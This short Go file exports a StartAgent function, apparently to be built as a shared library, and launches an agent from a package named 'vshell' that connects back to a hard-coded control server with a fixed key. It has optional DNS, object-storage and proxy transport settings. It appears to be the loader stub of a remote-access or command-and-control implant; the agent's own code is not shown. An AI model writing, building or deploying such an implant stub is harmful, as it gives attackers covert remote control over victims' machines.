package main

/*
#include <stdint.h>
*/
import "C"

import (
	"context"

	"vshell/internal/agent"
)

var (
	serverAddr = "127.0.0.1:8084"
	vkey       = "qwe123qwe"
	verifyKey  = ""
	transport  = "tcp"
	dnsDomain  = ""
	publicDNS  = ""
	ossURL     = ""
	ossKey     = ""
	proxyURL   = ""
)

//export StartAgent
func StartAgent() {
	_ = agent.New(agent.Config{
		ServerAddr: serverAddr,
		Vkey:       vkey,
		VerifyKey:  verifyKey,
		Transport:  transport,
		DNSDomain:  dnsDomain,
		PublicDNS:  publicDNS,
		OSSURL:     ossURL,
		OSSKey:     ossKey,
		ProxyURL:   proxyURL,
	}).Run(context.Background())
}

func main() {}
